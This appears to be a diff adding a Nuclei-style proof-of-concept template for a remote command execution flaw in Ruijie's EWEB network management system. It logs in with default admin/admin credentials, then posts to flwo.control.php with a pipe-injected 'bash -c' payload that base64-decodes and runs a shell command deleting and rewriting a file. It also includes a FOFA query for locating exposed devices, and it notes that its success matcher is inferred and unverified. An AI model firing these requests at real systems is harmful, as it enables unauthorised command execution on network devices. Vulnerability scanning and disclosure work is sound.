@@ -1,0 +1,54 @@
+id: poc-17f1f709f55188726efd
+info:
+  name: 锐捷EWEBflwo.contro存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/17f1f709f55188726efd44f1950d2dec
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 17f1f709f55188726efd44f1950d2dec
+    fofa: + fofa`title="锐捷网络-EWEB网管系统"`
+http:
+- raw:
+  - 'POST /ddi/server/login.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    User-Agent: Mozilla/5.0
+
+
+    username=admin&password=admin?'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0
+
+    Connection: close
+
+    Content-Length: 160
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: RUIJIEID=e3t2n743strq8lu1anqod3bhu6;
+
+    Accept-Encoding: gzip
+
+
+    type=%7Cbash+-c+%27echo+cm0gLXJmIC4uL2lrbTEyMy50eHQgJiYgZWNobyBIZWxsb1dvcmxkID4gLi4vaWttMTIzLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%26%26+exit+0%27'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
